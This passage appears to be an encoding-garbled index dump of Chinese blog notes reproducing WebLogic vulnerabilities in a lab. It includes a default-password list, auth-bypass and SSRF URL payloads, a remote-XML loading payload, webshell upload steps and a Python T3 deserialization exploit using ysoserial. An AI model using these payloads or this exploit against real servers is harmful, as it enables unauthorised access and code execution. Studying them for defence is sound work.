(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"å‚è€ƒ\rhttps://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/ https://y4er.com/posts/weblogic-cve-2021-2109-jndi-rce/ ","date":"2025-05-11","objectID":"/posts/0846c48/:2:4","tags":["Java"],"title":"Weblogicå­¦ä¹ (2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"å¼±å£ä»¤ getshell\rå¼±å£ä»¤\rè®¿é—® WebLogic /console æ¥å£ï¼Œå¯èƒ½å­˜åœ¨çš„å¼±å£ä»¤å¦‚ä¸‹ è´¦æˆ· å¯†ç  system password weblogic weblogic guest guest portaladmin portaladmin admin security joe password mary password system security wlcsystem wlcsystem wlcsystem sipisystem ä¸€äº›å¼±å£ä»¤å¯†ç  weblogic1 weblogic12 weblogic123 weblogic@123 webl0gic weblogic# weblogic@ è¿™é‡Œé”™è¯¯å¯†ç 5æ¬¡ä¹‹åå°±ä¼šè‡ªåŠ¨é”å®šï¼Œç”¨ qax æ­å»ºçš„è¿™ä¸ªç¯å¢ƒçš„è´¦æˆ·å¯†ç ä¸ºï¼šweblogicã€qaxateam01 æ–‡ä»¶ä¸Šä¼ \rä¹‹åå°±åœ¨å·¦è¾¹åŸŸç»“æ„å¤„çš„éƒ¨ç½²é‚£è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œç‚¹å‡»å®‰è£…åä¸Šä¼ æ–‡ä»¶ï¼Œéšä¾¿å¼„ä¸ª jsp æœ¨é©¬ï¼Œå‹ç¼©æˆ zip åæ”¹åç¼€ä¸º war å°†æ–‡ä»¶ä¼ åœ¨ä¸Šé¢é‚£å¤„ ç„¶åä¸€ç›´ç‚¹ä¸‹ä¸€æ­¥ï¼Œæœ€åç‚¹å®Œæˆï¼Œä¹‹åå¯åŠ¨å°±èƒ½ getshell äº† ","date":"2025-05-11","objectID":"/posts/0846c48/:2:5","tags":["Java"],"title":"Weblogicå­¦ä¹ (2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"CVE-2020-14882/CVE-2020-14883 æœªæˆæƒ RCE\rè¿™é‡Œ rce æ˜¯åœ¨æœªæˆæƒçš„åŸºç¡€ä¸Šè¿›åå° rce çš„ï¼Œç®€å•åœ°ä»‹ç»ä¸‹ä¸¤ä¸ªæ¼æ´ CVE-2020-14883ï¼šå…è®¸æœªæˆæƒçš„ç”¨æˆ·é€šè¿‡ç›®å½•ç©¿è¶Šç»“åˆåŒé‡ URL ç¼–ç çš„æ–¹å¼æ¥ç»•è¿‡ç®¡ç†æ§åˆ¶å°çš„æƒé™éªŒè¯è®¿é—®åå°ã€‚ CVE-2020-14882ï¼šå…è®¸åå°ä»»æ„ç”¨æˆ·é€šè¿‡ HTTP åè®®æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ å½±å“ç‰ˆæœ¬\rOracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 CVE-2020-14883\rç›´æ¥è®¿é—® console ä¼šè·³è½¬åˆ° /console/login/LoginForm.jsp è¿›è¡Œç™»å½•ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨åŒé‡ url ç¼–ç +ç›®å½•ç©¿è¶Šè¿› console åå°ï¼Œpayload /console/css/%252e%252e%252fconsole.portal è¿›å»åå¾ˆæ˜æ˜¾å’Œä¹‹å‰å¼±å£ä»¤è¿›å»çš„åå°ä¸ä¸€æ ·ï¼Œæ²¡æœ‰éƒ¨ç½²ï¼Œæ— æ³•ä¸Šä¼ æ¶æ„ war åŒ…æ¥æ‹¿ shellï¼Œæ¥ä¸‹æ¥å¯ä»¥ç»“åˆ CVE-2020-14882 æ¥ getshell CVE-2020-14882\råœ¨ä¸Šè¿°æœªæˆæƒè¿›å…¥çš„åå°æ˜¯ä½æƒé™çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨ CVE-2020-14883 æ¥æ‰“ï¼Œæœ‰ä¸¤ç§æ‰“æ³•ï¼Œä¸€æ˜¯ç”¨ com.tangosol.coherence.mvel2.sh.ShellSession æ¥ç›´æ¥ rceï¼ŒäºŒæ˜¯ç”¨ com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext åŠ è½½æ¶æ„ xml æ–‡ä»¶æ¥ rce æ–¹æ³•ä¸€\råˆ©ç”¨çš„æ˜¯ com.tangosol.coherence.mvel2.sh.ShellSession ç±» æ­¤åˆ©ç”¨æ–¹æ³•åªèƒ½åœ¨ Weblogic 12.2.1 åŠä»¥ä¸Šç‰ˆæœ¬åˆ©ç”¨ï¼Œå› ä¸ºä½ç‰ˆæœ¬å¹¶ä¸å­˜åœ¨ com.tangosol.coherence.mvel2.sh.ShellSession ç±» payload1 /console/images/%252E%252E%252Fconsole.portal?_nfpb=true\u0026_pageLabel=HomePage1\u0026handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/pocIsok%27);%22); åœ¨ http å¤´æ·»åŠ  cmd å‚æ•°åŠå…¶å€¼å³å¯ rce æ–¹æ³•äºŒ\råˆ©ç”¨çš„æ˜¯ com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext ä»è¿™ä¸ªå‡½æ•°éƒ½å¯ä»¥çœ‹å‡ºæ¥ï¼ŒåŠ è½½æ¶æ„xmlæ¥rceï¼Œæ­¤åˆ©ç”¨æ–¹æ³•æ— ç‰ˆæœ¬é™åˆ¶ï¼Œä½†æ˜¯éœ€è¦å‡ºç½‘ï¼Œå…¬ç½‘ä¸Šæ”¾1.xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"\u003e \u003cbean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"\u003e \u003cconstructor-arg\u003e \u003clist\u003e \u003cvalue\u003ebash\u003c/value\u003e \u003cvalue\u003e-c\u003c/value\u003e \u003cvalue\u003e\u003c![CDATA[touch /tmp/xml_test]]\u003e\u003c/value\u003e \u003c/list\u003e \u003c/constructor-arg\u003e \u003c/bean\u003e \u003c/beans\u003e ç„¶åè®©å…¶åŠ è½½ /console/css/%252e%252e%252fconsole.portal?_nfpb=true\u0026_pageLabel=\u0026handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://ip:port/1.xml\") ","date":"2025-05-11","objectID":"/posts/0846c48/:2:6","tags":["Java"],"title":"Weblogicå­¦ä¹ (2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"CVE-2014-4210 SSRF\rå½±å“ç‰ˆæœ¬\rOracle WebLogic Server 10.0.2, 10.3.6 æ¼æ´å¤ç°\rWebLogic çš„ SearchPublicReqistries.jsp æ¥å£å­˜åœ¨ SSRF æ¼æ´ï¼Œå¦‚æœæœåŠ¡ç«¯æˆ–å†…ç½‘å­˜åœ¨ Redis æœªæˆæƒè®¿é—®æ¼æ´ç­‰åˆ™å¯ä»¥è¿›ä¸€æ­¥æ‰“æ¼æ´ç»„åˆæ‹³è¿›è¡Œæ”»å‡»åˆ©ç”¨ã€‚ SearchPublicReqistries.jsp åœ¨ /wlserver/server/lib/uddiexplorer.war ä¸­ operator å‚æ•°å°±æ˜¯ä¼ è¿›å»çš„ urlï¼Œç„¶å search.getResponse() å°±ä¼šå‘è¿™ä¸ª url å‘é€è¯·æ±‚ï¼Œè€Œä¸”è¿™ä¸ªæœåŠ¡æ²¡æœ‰ä»»ä½•é‰´æƒï¼Œå¯ä»¥ç›´æ¥è®¿é—®ï¼Œç”¨ payload æ¢æµ‹ä¸‹ 7001 ç«¯å£ /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name\u0026txtSearchname=sdf\u0026txtSearchkey=\u0026txtSearchfor=\u0026selfor=Business+location\u0026btnSubmit=Search\u0026operator=http://127.0.0.1:7001 å›æ˜¾ä¸º An error has occurred weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code (Not Found). Please ensure that your URL is correct, and the web service has deployed without error. å½“æ¢æµ‹ 7000 ç«¯å£æ—¶å›æ˜¾ An error has occurred weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: '1' addresses, but could not connect over HTTP to server: '127.0.0.1', port: '7000' å¯ä»¥çœ‹åˆ° 7001 ç«¯å£åªæ˜¯æ²¡æ‰¾åˆ°æœåŠ¡è€Œ 7000 ç«¯å£éƒ½ä¸èƒ½å»ºç«‹ http è¿æ¥ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ¥æ¢æµ‹ç«¯å£ ","date":"2025-05-11","objectID":"/posts/0846c48/:2:7","tags":["Java"],"title":"Weblogicå­¦ä¹ (2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"CVE-2018-2894 ä»»æ„æ–‡ä»¶ä¸Šä¼ \rå½±å“ç‰ˆæœ¬\rWeblogic 10.3.6ï¼Œ12.1.3ï¼Œ12.2.1.2ï¼Œ12.2.1.3 æ¼æ´å¤ç°\rweblogicå¦‚æœå¼€å¯äº†webæœåŠ¡æµ‹è¯•é¡µï¼ˆé»˜è®¤ä¸å¼€å¯ï¼‰ï¼Œåˆ™åˆ†åˆ«ä¼šåœ¨/ws_utc/begin.doä»¥åŠ/ws_utc/config.doè¿™ä¸¤ä¸ªé¡µé¢å­˜åœ¨ä»»æ„ä¸Šä¼ getshellæ¼æ´ ç”±äºè¯¥è®¾ç½®é»˜è®¤ä¸å¼€å¯ï¼Œæ‰€ä»¥æ­¤æ¼æ´æœ‰ä¸€å®šçš„å±€é™æ€§ â€œé«˜çº§â€ ä¸­å¼€å¯ â€œå¯ç”¨ Web æœåŠ¡æµ‹è¯•é¡µâ€ï¼Œä½†æˆ‘è¿™æ²¡æœ‰è¿™ä¸ªé€‰é¡¹ï¼Œèµ›åšå¤ç°ä¸‹ï¼ŒæŒºç®€å•çš„åæ­£ è®¿é—®æ¼æ´é¡µé¢http://your-ip:7001/ws_utc/config.doï¼ˆéœ€è¦æ‰‹åŠ¨è®¾ç½®ä¸€ä¸‹ç¯å¢ƒè®¾ç½®Work Home Dirä¸ºï¼Œ/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/cssï¼‰ ç‚¹å‡»å®‰å…¨ -\u003e æ·»åŠ ï¼Œåå­—å’Œå¯†ç å¯ä»¥éšæ„è®¾ç½®ï¼Œä¼ ä¸ª jsp é©¬ æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ä¸ºhttp://your-ip:7001/ws_utc/css/config/keystore/[æ—¶é—´æˆ³]_[æ–‡ä»¶å]ï¼Œè¿™é‡Œçš„æ—¶é—´æˆ³è·å–æ–¹å¼æœ‰ä¸¤ç§ï¼Œå…¶ä¸€ä¸ºbpæŠ“åŒ…æŸ¥çœ‹ï¼Œå…¶äºŒåˆ©ç”¨æµè§ˆå™¨è‡ªå¸¦çš„æ£€æŸ¥è·å–ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š ç„¶å rce å³å¯ ","date":"2025-05-11","objectID":"/posts/0846c48/:2:8","tags":["Java"],"title":"Weblogicå­¦ä¹ (2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"å°ç»“\ræœ‰æ€»çš„åˆ©ç”¨è„šæœ¬ï¼šhttps://github.com/zhzyker/exphub/tree/master/weblogic éƒ½æŒºç®€å•çš„ï¼Œæ„Ÿè§‰é™åˆ¶æ¯”è¾ƒå¤šï¼Œä¸æ˜¯éœ€è¦ç‰ˆæœ¬ä½å°±æ˜¯è¦è¿›åå°æˆ–è€…å¼€å¯æŸäº›ç‰¹æ®Šé…ç½®ï¼Œndayæ˜¯è¿™æ ·çš„ï¼Œä¹Ÿç®—æ˜¯å¯¹ weblogic æœ‰ä¸ªç®€å•çš„äº†è§£ ","date":"2025-05-11","objectID":"/posts/0846c48/:2:9","tags":["Java"],"title":"Weblogicå­¦ä¹ (2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"å‚è€ƒ\rhttps://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/ https://blog.csdn.net/weixin_51198941/article/details/134193310 ","date":"2025-05-11","objectID":"/posts/0846c48/:2:10","tags":["Java"],"title":"Weblogicå­¦ä¹ (2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"æ€»ç»“\ræœ‰æ€»çš„åˆ©ç”¨è„šæœ¬ï¼šhttps://github.com/zhzyker/exphub/tree/master/weblogic åˆ©ç”¨ç›¸å¯¹äºååºåˆ—åŒ–ç®€å•å¾ˆå¤šï¼Œä½†é™åˆ¶éƒ½æ¯”è¾ƒå¤§æ„Ÿè§‰ï¼ŒWeblogic æš‚æ—¶åˆ°è¿™ï¼Œä¹‹åé‡åˆ°å…¶ä»–åˆ©ç”¨æ‰‹æ³•å†è¯´ ","date":"2025-05-11","objectID":"/posts/0846c48/:3:0","tags":["Java"],"title":"Weblogicå­¦ä¹ (2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"å‰è¨€\ræœ€è¿‘åœ¨å­¦ Java ç›¸å…³æ¡†æ¶çš„æ¼æ´ï¼Œå…ˆä» Weblogic å¼€å§‹ï¼Œå…ˆä»æœ€ç†Ÿæ‚‰çš„ååºåˆ—åŒ–å¼€å§‹ï¼Œä¹‹åå†å­¦ä¹ å…¶ä»–åˆ©ç”¨ï¼Œä¹‹åçš„æ–‡ç« éƒ½æ˜¯ 10.3.6.0 ç‰ˆæœ¬çš„ Weblogic ï¼Œç¯å¢ƒæ­å»ºå…¨ç”¨ T3 çš„å°±å¥½äº† ","date":"2025-05-11","objectID":"/posts/705d533/:1:0","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"WebLogic T3 ååºåˆ—åŒ–ï¼ˆCVE-2015-4852ï¼‰\r","date":"2025-05-11","objectID":"/posts/705d533/:2:0","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"ç®€ä»‹\rWebLogic æ˜¯ Oracle å…¬å¸æä¾›çš„ä¸€ä¸ªJava EE åº”ç”¨æœåŠ¡å™¨ï¼Œå…¨åæ˜¯ Oracle WebLogic Serverï¼Œä¸»è¦ç”¨äºéƒ¨ç½²ã€è¿è¡Œ Java Web åº”ç”¨ï¼ˆå¦‚ JSPã€Servletã€EJBã€Spring ç­‰ï¼‰ã€‚ ç›¸è¾ƒäºTomcatï¼ŒWebLogicæ›´é€‚åˆå¤§å‹é¡¹ç›®å’Œå¼€å‘ç¯å¢ƒ T3 åè®®å…¶å®æ˜¯ Weblogic å†…ç‹¬æœ‰çš„ä¸€ä¸ªåè®®ï¼Œåœ¨ Weblogic ä¸­å¯¹ RMI ä¼ è¾“å°±æ˜¯ä½¿ç”¨çš„ T3 åè®®ã€‚åœ¨ RMI ä¼ è¾“å½“ä¸­ï¼Œè¢«ä¼ è¾“çš„æ˜¯ä¸€ä¸²åºåˆ—åŒ–çš„æ•°æ®ï¼Œåœ¨è¿™ä¸²æ•°æ®è¢«æ¥æ”¶åï¼Œæ‰§è¡Œååºåˆ—åŒ–çš„æ“ä½œã€‚ åœ¨ T3 çš„è¿™ä¸ªåè®®é‡Œé¢åŒ…å«è¯·æ±‚åŒ…å¤´å’Œè¯·æ±‚çš„ä¸»ä½“è¿™ä¸¤éƒ¨åˆ†å†…å®¹ã€‚ ","date":"2025-05-11","objectID":"/posts/705d533/:2:1","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"ç¯å¢ƒæ­å»º\rç”¨dockeræ­å»ºï¼Œç”¨qaxçš„æ­å»ºè„šæœ¬ï¼šhttps://github.com/QAX-A-Team/WeblogicEnvironment å…ˆä¸‹ä¸ª jdk7u21ï¼Œå†æ¥ä¸ªå…¶å¯¹äºç‰ˆæœ¬çš„ Weblogic å®‰è£…åŒ…ï¼Œ1036 çš„ generic ç‰ˆæœ¬ï¼Œç„¶åæŠŠä¸‹å¥½çš„ JDK å’Œ Weblogic ç„¶ååˆ†åˆ«æ”¾åœ¨WeblogicEnvironment çš„ jdks å’Œ weblogics ä¸­ æ”¹ä¸‹ Dockerfile # åŸºç¡€é•œåƒ FROM centos:centos7 # å‚æ•° ARG JDK_PKG ARG WEBLOGIC_JAR # è§£å†³libnslåŒ…ä¸¢å¤±çš„é—®é¢˜ # RUN yum -y install libnsl # åˆ›å»ºç”¨æˆ· RUN groupadd -g 1000 oinstall \u0026\u0026 useradd -u 1100 -g oinstall oracle # åˆ›å»ºéœ€è¦çš„æ–‡ä»¶å¤¹å’Œç¯å¢ƒå˜é‡ RUN mkdir -p /install \u0026\u0026 mkdir -p /scripts ENV JDK_PKG=$JDK_PKG ENV WEBLOGIC_JAR=$WEBLOGIC_JAR # å¤åˆ¶è„šæœ¬ COPY scripts/jdk_install.sh /scripts/jdk_install.sh COPY scripts/jdk_bin_install.sh /scripts/jdk_bin_install.sh COPY scripts/weblogic_install11g.sh /scripts/weblogic_install11g.sh COPY scripts/weblogic_install12c.sh /scripts/weblogic_install12c.sh COPY scripts/create_domain11g.sh /scripts/create_domain11g.sh COPY scripts/create_domain12c.sh /scripts/create_domain12c.sh COPY scripts/open_debug_mode.sh /scripts/open_debug_mode.sh COPY jdks/$JDK_PKG . COPY weblogics/$WEBLOGIC_JAR . # åˆ¤æ–­jdkæ˜¯åŒ…ï¼ˆbin/tar.gzï¼‰weblogicåŒ…ï¼ˆ11g/12cï¼‰è½½å…¥å¯¹åº”è„šæœ¬ RUN if [ $JDK_PKG == *.bin ] ; then echo ****è½½å…¥JDK binå®‰è£…è„šæœ¬**** \u0026\u0026 cp /scripts/jdk_bin_install.sh /scripts/jdk_install.sh ; else echo ****è½½å…¥JDK tar.gzå®‰è£…è„šæœ¬**** ; fi RUN if [ $WEBLOGIC_JAR == *1036* ] ; then echo ****è½½å…¥11gå®‰è£…è„šæœ¬**** \u0026\u0026 cp /scripts/weblogic_install11g.sh /scripts/weblogic_install.sh \u0026\u0026 cp /scripts/create_domain11g.sh /scripts/create_domain.sh ; else echo ****è½½å…¥12cå®‰è£…è„šæœ¬**** \u0026\u0026 cp /scripts/weblogic_install12c.sh /scripts/weblogic_install.sh \u0026\u0026 cp /scripts/create_domain12c.sh /scripts/create_domain.sh ; fi # è„šæœ¬è®¾ç½®æƒé™åŠè¿è¡Œ RUN chmod +x /scripts/jdk_install.sh RUN chmod +x /scripts/weblogic_install.sh RUN chmod +x /scripts/create_domain.sh RUN chmod +x /scripts/open_debug_mode.sh # å®‰è£…JDK RUN /scripts/jdk_install.sh # å®‰è£…weblogic RUN /scripts/weblogic_install.sh # åˆ›å»ºWeblogic Domain RUN /scripts/create_domain.sh # æ‰“å¼€Debugæ¨¡å¼ RUN /scripts/open_debug_mode.sh # å¯åŠ¨ Weblogic Server # CMD [\"tail\",\"-f\",\"/dev/null\"] CMD [\"/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh\"] EXPOSE 7001 ç„¶åè¿è¡Œ docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar -t weblogic1036jdk7u21 . docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 å¦‚æœè¯´æ‰¾ä¸åˆ° weblogic_install.sh ï¼Œé‚£å°±æŠŠ .gitignore æ–‡ä»¶æœ€åçš„ weblogics/ å»æ‰ å¦‚æœé‡åˆ°è¯´å†…å­˜ä¸è¶³ï¼Œé‚£å°±åœ¨é…ç½®æ–‡ä»¶ docker.service çš„ ExecStart é…ç½®åé¢åŠ ä¸Š --default-ulimit nofile=65536:65536 ç„¶åè®¿é—® http://192.168.2.128:7001/console/login/LoginForm.jsp å³å¯ ç„¶åè®¾ç½®ä¸‹è¿œç¨‹è°ƒè¯•ï¼Œéœ€è¦æŠŠä¸€äº›weblogicçš„ä¾èµ–JaråŒ…ç»™å¯¼å‡ºæ¥æ‰èƒ½è¿›è¡Œè¿œç¨‹è°ƒè¯• mkdir ./middleware docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./middleware/ docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver ./middleware/ docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./middleware/ ç„¶åç”¨ IDEA æ‰“å¼€ wlserver æ–‡ä»¶å¤¹ï¼Œå¯¼å…¥ coherence_3.7/lib å’Œ modules æŠŠ server/lib ä¹Ÿä½œä¸ºä¾èµ–è¿›è¡Œå¯¼å…¥ ç„¶åæ·»åŠ è¿œç¨‹ JVM è°ƒè¯• ","date":"2025-05-11","objectID":"/posts/705d533/:2:2","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"æ¼æ´å¤ç°\r10.3.6 ç‰ˆæœ¬çš„ exp from os import popen import struct # è´Ÿè´£å¤§å°ç«¯çš„è½¬æ¢ import subprocess from sys import stdout import socket import re import binascii def generatePayload(gadget,cmd): YSO_PATH = r\"D:\\14.Java\\tools\\windows_tools\\windows_tools\\ysoserial-all.jar\" popen = subprocess.Popen(['java','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE) return popen.stdout.read() def T3Exploit(ip,port,payload): sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM) sock.connect((ip,port)) handshake = \"t3 10.3.6\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\" sock.sendall(handshake.encode()) data = sock.recv(1024) compile = re.compile(\"HELO:(.*).0.false\") match = compile.findall(data.decode()) if match: print(\"Weblogic: \"+\"\".join(match)) else: print(\"Not Weblogic\") #return header = binascii.a2b_hex(b\"00000000\") t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\") desflag = binascii.a2b_hex(b\"fe010000\") payload = header + t3header +desflag+ payload payload = struct.pack(\"\u003eI\",len(payload)) + payload[4:] sock.send(payload) if __name__ == \"__main__\": ip = \"192.168.2.128\" port = 7001 gadget = \"CommonsCollections1\" cmd = \"touch /tmp/success_test\" payload = generatePayload(gadget,cmd) T3Exploit(ip,port,payload) åªè¯•äº†ä¸‹ cc é“¾ï¼Œ1ã€3ã€6ã€7éƒ½èƒ½æ‰“é€š WebLogicè¯·æ±‚åˆ†æ\ræœ¬åœ°æ‹¿wiresharkæŠ“ä¸ªå›ç¯åŒ…ï¼Œå€Ÿç”¨ä¸‹ä½¬çš„å›¾ ç¬¬ä¸€éƒ¨åˆ†æ˜¯è¯·æ±‚åŒ…å¤´ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯æœåŠ¡ç«¯çš„å“åº”ï¼Œç¬¬ä¸‰éƒ¨åˆ†æ˜¯è¯·æ±‚ä¸»ä½“ å¯ä»¥çœ‹åˆ°æœåŠ¡ç«¯çš„å“åº”ï¼Œåœ¨å¾—åˆ°äº†æ­£ç¡®çš„è¯·æ±‚å¤´åï¼ŒWeblogicä¼šè¿”å›ä¸€ä¸ªåŒ…å«ç‰ˆæœ¬å·çš„ä¿¡æ¯ åœ¨ååºåˆ—åŒ–æ•°æ®åŒ…ä¸­ï¼Œac ed 00 05 æ˜¯ååºåˆ—åŒ–æ ‡å¿—ï¼Œåœ¨ T3 åè®®ä¸­ç”±äºæ¯ä¸ªååºåˆ—åŒ–æ•°æ®åŒ…å‰é¢éƒ½æœ‰ fe 01 00 00 ï¼Œæ‰€ä»¥è¿™é‡Œååºåˆ—åŒ–çš„æ ‡å¿—å°±ç›¸å½“äºæ˜¯ fe 01 00 00 ac ed 00 05 æ•´ä¸ªè¯·æ±‚ä¸»ä½“åŒ…å«äº†6ä¸ªéƒ¨åˆ†çš„åºåˆ—åŒ–æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å…¶ä¸­ä»»æ„ä¸€ä¸ªéƒ¨åˆ†è¿›è¡Œæ”»å‡» ","date":"2025-05-11","objectID":"/posts/705d533/:2:3","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"æ¼æ´åˆ†æ\rå…¥å£ç±»æ˜¯ weblogic.rjvm.InboundMsgAbbrev ï¼Œå…³æ³¨åˆ°å…¶ readObject æ–¹æ³• private Object readObject(MsgAbbrevInputStream var1) throws IOException, ClassNotFoundException { int var2 = var1.read(); switch (var2) { case 0: return (new ServerChannelInputStream(var1)).readObject(); case 1: return var1.readASCII(); default: throw new StreamCorruptedException(\"Unknown typecode: '\" + var2 + \"'\"); } } å¯ä»¥çœ‹åˆ°è¿™é‡Œ var1 çš„ head çš„å€¼å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„åºåˆ—åŒ–çš„æ•°æ® ç„¶åè¿›å…¥ ServerChannelInputStream æ„é€ å‡½æ•° private ServerChannelInputStream(MsgAbbrevInputStream var1) throws IOException { super(var1); this.serverChannel = var1.getServerChannel(); } è¿™é‡Œ var1 æ˜¯ä¸ª MsgAbbrevInputStream å¯¹è±¡ï¼Œè¿™ä¸ªç±»åœ¨ Weblogic ä¸­å®ç°çš„ä¸€ä¸ª Java è¾“å…¥æµç±»ï¼Œç”¨äºæ¥æ”¶æ¶ˆæ¯å¹¶å°†å…¶è½¬æ¢ä¸º Java å¯¹è±¡ï¼Œ super æ–¹æ³•è·Ÿè¿›å»æ²¡å•¥ä¸œè¥¿ï¼Œç»§ç»­è·Ÿè¿› getServerChannel public ServerChannel getServerChannel() { return this.connection.getChannel(); } this.connection ä¸­å­˜å‚¨äº†ä¸€äº›è¿æ¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬IPï¼Œç«¯å£ç­‰ï¼Œè·Ÿè¿› getChannel æ–¹æ³• public final ServerChannel getChannel() { return MuxableSocketT3.this.getChannel(); } ç»§ç»­è·Ÿè¿›ï¼Œä¼šè°ƒç”¨åˆ° BaseAbstractMuxableSocket çš„ getChannel æ–¹æ³• public final ServerChannel getChannel() { return this.channel; } å¤„ç†å®Œåå›åˆ° InboundMsgAbbrev#readObject å¤„ï¼ŒServerChannelInputStream ç»§æ‰¿äº† ObjectInputStream ç±»ï¼Œè°ƒç”¨å…¶ readObject æ–¹æ³• ä¹‹åè·Ÿè¿›åä¼šè°ƒç”¨åˆ° InboundMsgAbbrev#resolveClass ï¼Œè¿™å…¶ä¸­çš„è°ƒç”¨é“¾ resolveClass:108, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm) readNonProxyDesc:1610, ObjectInputStream (java.io) readClassDesc:1515, ObjectInputStream (java.io) readOrdinaryObject:1769, ObjectInputStream (java.io) readObject0:1348, ObjectInputStream (java.io) readObject:370, ObjectInputStream (java.io) readObject:66, InboundMsgAbbrev (weblogic.rjvm) è¿™é‡Œçš„ var1 å°±æ˜¯ sun.reflect.annotation.AnnotationInvocationHandler ç±» å†ç„¶åå°±ä¼šè°ƒç”¨åˆ° AnnotationInvocationHandler#readObject äº†ï¼Œä¹‹åå°±æ˜¯ cc1 äº† åˆ†æå®Œè°ƒç”¨æµç¨‹åæˆ‘ä»¬å†å›è¿‡å¤´æ¥çœ‹åˆ°poc header = binascii.a2b_hex(b\"00000000\") t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\") desflag = binascii.a2b_hex(b\"fe010000\") payload = header + t3header +desflag+ payload payload = struct.pack(\"\u003eI\",len(payload)) + payload[4:] è¿™é‡Œ header è¡¨ç¤ºæ•°æ®åŒ…çš„é•¿åº¦ï¼Œæœ€å¼€å§‹åªç”¨äºå ä½ï¼Œå¯ä»¥çœ‹åˆ°æœ€åç”Ÿæˆ payload æ—¶å°†å…¶è¦†ç›–äº†ï¼Œt3header æ˜¯ T3 åè®®çš„åè®®å¤´ï¼Œæœ€å desflag å°±æ˜¯ååºåˆ—åŒ–æ ‡è¯†ï¼Œä½†åœ¨ä¹‹å‰çš„åˆ†æä¸­æˆ‘ä»¬çœ‹åˆ°æ˜¯8ä¸ªå­—èŠ‚ï¼Œè¿™é‡Œå´åªæœ‰4ä¸ªå­—èŠ‚ï¼Œè¿™æ˜¯å› ä¸º yso ç”Ÿæˆçš„ payload ä¼šè¡¥å…¨åå››ä¸ªå­—èŠ‚ ","date":"2025-05-11","objectID":"/posts/705d533/:2:4","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"æ¼æ´ä¿®å¤\rä¸Šé¢åˆ†ææˆ‘ä»¬å¯ä»¥çœ‹å‡ºåŠ è½½ç±»å…¶å®æ˜¯é€šè¿‡è°ƒç”¨ resolveClass() æ–¹æ³•ï¼Œå†é€šè¿‡åå°„è·å–åˆ°ä»»æ„ç±»çš„ï¼Œå®˜æ–¹ç»™å‡ºçš„ä¿®å¤å°±æ˜¯åœ¨è¿™ä¸ªæ–¹æ³•ä¸­åŠ å…¥é»‘åå• å› 